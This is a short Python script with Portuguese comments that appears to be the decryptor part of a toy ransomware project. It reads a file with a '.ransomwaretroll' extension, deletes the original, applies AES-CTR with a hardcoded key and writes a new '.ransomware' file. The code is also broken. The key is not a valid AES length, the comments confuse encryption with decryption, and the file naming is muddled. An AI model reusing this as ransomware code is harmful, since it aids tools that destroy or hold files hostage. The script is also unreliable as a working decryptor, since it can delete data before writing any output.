import os
import pyaes

# Abrir arquivo criptografado

file_name = "test.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remover o original

os.remove(file_name)

# Chave de descriptografia

key = b"testeransomware"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar

decrypted_data = aes.encrypt(file_data)

# Salvar o criptografado

new_file = file_name + ".ransomware"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypted_data)
new_file.close()